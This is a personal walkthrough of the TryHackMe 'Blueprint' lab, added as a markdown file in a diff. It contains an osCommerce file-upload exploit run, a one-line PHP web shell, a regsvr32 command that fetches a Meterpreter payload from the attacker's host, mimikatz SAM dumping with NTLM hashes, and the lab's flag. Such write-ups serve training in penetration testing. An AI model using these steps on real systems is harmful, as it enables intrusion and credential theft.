@@ -1,0 +1,163 @@
+# IP Address
+
+10.10.156.73
+
+# OPEN PORTS
+
+80/tcp    open  http         Microsoft IIS httpd 7.5
+443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
+8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+
+https://10.10.156.73/oscommerce-2.3.4/catalog/
+
+gobuster - /install
+
+https://10.10.156.73/oscommerce-2.3.4/catalog/install/install.php
+
+finding exploit with 
+
+searchsploit oscommerce 2.3.4
+
+osCommerce 2.3.4.1 - Arbitrary File Upload                    | php/webapps/43191.py
+
+searchsploit -m php/webapps/43191.py
+  Exploit: osCommerce 2.3.4.1 - Arbitrary File Upload
+      URL: https://www.exploit-db.com/exploits/43191
+     Path: /usr/share/exploitdb/exploits/php/webapps/43191.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/digi/ctf/thm/blueprint/43191.py
+
+nano shell.php 
+<?php
+
+passthru($_GET["cmd"]);
+
+?>
+
+python2 43191.py -u http://localhost:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php
+[+] Authentication successful
+[+] Successfully prepared the exploit and created a new newsletter with nID 1
+[+] Successfully locked the newsletter. Now attempting to upload..
+[*] Now trying to verify that the file shell.php uploaded..
+[+] Got a HTTP 200 Reply for the uploaded file!
+[+] The uploaded file should now be available at http://localhost:8080/oscommerce-2.3.4/catalog/admin/shell.php
+
+# msdfconsole
+msf6 > run
+[-] Unknown command: run. Run the help command for more details.
+msf6 > use multi/script/web_delivery
+[*] Using configured payload python/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > set LHOST tun0
+LHOST => tun0
+msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.6.45.223
+SRVHOST => 10.6.45.223
+msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > set target 3
+target => 3
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/script/web_delivery) > 
+[*] Started reverse TCP handler on 10.6.45.223:4444 
+[*] Using URL: http://10.6.45.223:8080/DRmOqicv
+[*] Server started.
+[*] Run the following command on the target machine:
+regsvr32 /s /n /u /i:http://10.6.45.223:8080/DRmOqicv.sct scrobj.dll
+[*] 10.10.156.73     web_delivery - Handling .sct Request
+[*] 10.10.156.73     web_delivery - Delivering Payload (3531 bytes)
+[*] Sending stage (177734 bytes) to 10.10.156.73
+[*] Meterpreter session 1 opened (10.6.45.223:4444 -> 10.10.156.73:49472) at 2025-05-02 01:27:35 -0400
+[*] 10.10.156.73     web_delivery - Handling .sct Request
+[*] 10.10.156.73     web_delivery - Delivering Payload (3512 bytes)
+[*] Sending stage (177734 bytes) to 10.10.156.73
+[*] Meterpreter session 2 opened (10.6.45.223:4444 -> 10.10.156.73:49475) at 2025-05-02 01:27:51 -0400
+
+msf6 exploit(multi/script/web_delivery) > shell
+[-] Unknown command: shell. Run the help command for more details.
+msf6 exploit(multi/script/web_delivery) > sessions -k 2
+[*] Killing the following session(s): 2
+[*] Killing session 2
+[*] 10.10.156.73 - Meterpreter session 2 closed.
+msf6 exploit(multi/script/web_delivery) > exploit
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/script/web_delivery) > 
+[-] Handler failed to bind to 10.6.45.223:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+
+msf6 exploit(multi/script/web_delivery) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ BLUEP  10.6.45.223:4444 -> 10.10.15
+                                     RINT                         6.73:49472 (10.10.156.73)
+
+msf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+
+C:\Users\Administrator\Desktop>type root.txt.txt
+type root.txt.txt
+THM{aea1e3ce6fe7f89e10cea833ae009bee}
+
+# Find has for 'Lab' user
+
+04/11/2019  11:36 PM    <DIR>          .
+04/11/2019  11:36 PM    <DIR>          ..
+04/11/2019  11:40 PM    <DIR>          Administrator
+03/21/2017  04:30 PM    <DIR>          DefaultAppPool
+03/21/2017  04:09 PM    <DIR>          Lab
+07/14/2009  05:41 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)  19,506,720,768 bytes free
+
+C:\Users>cd Lab
+cd Lab
+
+C:\Users\Lab>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Lab>exit
+exit
+meterpreter > load mimikatz
+[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > lsa_dump_sam
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : BLUEPRINT
+SysKey : 147a48de4a9815d2aa479598592b086f
+Local SID : S-1-5-21-3130159037-241736515-3168549210
+
+SAMKey : 3700ddba8f7165462130a4441ef47500
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : Lab
+  Hash NTLM: 30e87bf999828446a1c1209ddde4c450
